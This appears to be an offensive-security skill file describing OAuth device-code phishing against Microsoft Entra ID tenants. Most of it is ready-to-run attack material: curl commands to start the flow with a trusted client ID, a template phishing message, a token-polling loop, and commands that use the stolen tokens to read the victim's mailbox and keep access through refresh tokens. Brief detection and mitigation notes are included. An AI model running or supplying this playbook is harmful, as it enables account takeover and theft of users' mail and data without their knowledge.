---
name: offensive-device-code-phish
description: "OAuth Device Code phishing — abuse the legitimate device-code flow (RFC 8628) to capture access + refresh tokens without traditional credential handoff. The user enters a code at microsoft.com/devicelogin which links the attacker's pending auth request to the user's session — yields long-lived tokens with no MFA prompt for many configs. Use as a high-success phishing primitive against Entra ID tenants."
---

# Device Code Phishing

The device-code OAuth flow lets devices without browsers authenticate. An attacker can initiate the flow with the target's tenant, receive a code + verification URL, and trick the user into entering the code at microsoft.com/devicelogin — granting the attacker tokens.

## Mechanics

```
1. Attacker → POST /devicecode → receives user_code + device_code + verification_uri
2. Attacker phishes: "Please go to https://microsoft.com/devicelogin and enter code XYZ"
3. User enters code → MS auth flow → user signs in (with MFA if required)
4. Attacker polls /token → receives access + refresh tokens linked to user's session
```

## Initiate the Flow

```bash
# Microsoft Graph PowerShell client (well-known app, broadly trusted)
curl -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode' \
  -d 'client_id=14d82eec-204b-4c2f-b7e8-296a70dab67e' \
  -d 'scope=https://graph.microsoft.com/.default offline_access'

# Returns:
# {
#   "user_code": "XYZ12345",
#   "device_code": "...",
#   "verification_uri": "https://microsoft.com/devicelogin",
#   "expires_in": 900
# }
```

## Phish

Send to target:
> "Please verify your account by going to **https://microsoft.com/devicelogin** and entering the code: **XYZ12345**"

The URL is legitimate Microsoft. The code is the phish.

Effective because:
- The verification URL is real
- No fake login page needed (no domain spoof)
- User's browser security warnings don't trigger
- MFA happens normally (so user trusts it)

## Poll for Token

```bash
# Poll every 5 seconds until user enters code
while true; do
  RESPONSE=$(curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \
    -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' \
    -d 'client_id=14d82eec-204b-4c2f-b7e8-296a70dab67e' \
    -d "device_code=$DEVICE_CODE")

  if echo "$RESPONSE" | grep -q access_token; then
    echo "$RESPONSE"
    break
  fi
  sleep 5
done
```

Result: access token + refresh token bound to the user's identity.

## Use the Tokens

```bash
TOKEN=$(echo $RESPONSE | jq -r .access_token)

# Graph as user
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me

# Mailbox
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me/messages

# Or import into ROADtools
roadrecon auth --access-token $TOKEN --refresh-token $REFRESH
```

The refresh token gives 90-day persistence (default) — refresh access tokens without re-auth.

## Detection

| Signal | Defender View |
|---|---|
| Sign-in audit shows device code grant | "interactiveTokenLogon" in sign-in logs |
| Sign-in from attacker IP after consent | Identity Protection (Risky Sign-In) |
| Refresh token use from foreign location | Conditional Access alerts |

Defenders' best detection is the sign-in IP delta — phishee enters code at home, attacker uses tokens from elsewhere.

## Conditional Access Implications

CA can require:
- Device compliance for sign-ins (but device-code flow doesn't surface device)
- Specific app exclusions (Microsoft Graph PowerShell often excluded for admin scripting)

If CA requires "compliant device" for the target user's sign-ins, device-code phish may still bypass for excluded apps.

## Mitigations

- Block device-code flow via CA: "Authentication flows" → "Device code flow" → Block
- User awareness training (the attack relies on user entering code)
- Admin-only access scoping for sensitive apps

## Engagement Cheatsheet

```bash
# 1. Initiate device code flow
curl -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode' \
  -d 'client_id=14d82eec-204b-4c2f-b7e8-296a70dab67e' -d 'scope=https://graph.microsoft.com/.default offline_access'

# 2. Send code + URL to target via authorized phishing channel

# 3. Poll for completion

# 4. Use tokens (Graph, mailbox, etc.)

# 5. Document: client app used, scope obtained, persistence (refresh token)
```

## Key References

- RFC 8628 (Device Authorization Grant)
- "TokenTactics" (Bobby Cooke / various researchers)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/device-code-phish.md
